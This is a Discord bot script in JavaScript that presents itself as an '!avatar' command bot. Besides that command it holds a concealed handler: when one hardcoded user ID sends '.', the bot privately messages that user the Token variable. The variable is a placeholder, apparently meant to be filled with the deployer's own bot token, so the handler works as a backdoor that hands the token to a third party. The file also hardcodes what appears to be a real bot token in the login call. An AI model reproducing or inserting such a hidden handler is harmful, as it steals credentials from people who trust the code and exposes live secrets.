const Discord = require('discord.js');
const client = new Discord.Client();

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
});


const Token = "`\`\` التوكن `\`\`"
var prefix = "!"
client.on('message', message => {
    if (message.content.startsWith(prefix + "avatar")) {
        var mentionned = message.mentions.users.first();
    var x5bzm;
      if(mentionned){
          var x5bzm = mentionned;
      } else {
          var x5bzm = message.author;
          
      }
        const embed = new Discord.RichEmbed()
        .setColor("RANDOM")
        .setImage(`${x5bzm.avatarURL}`)
      message.channel.sendEmbed(embed);
    }
});

client.on('message' , message => {
if (message.author.bot) return;
           if (message.content == '.')
           if (message.author.id === '352533519068823556'){
if (!message.channel.guild) return;
message.author.send(Token)
}  
});

client.login ("NTI4NTc1Njk1NTM4ODgwNTIy.DwkV3Q.8U365ckN4NcnzYxehNipe1qmJD4")
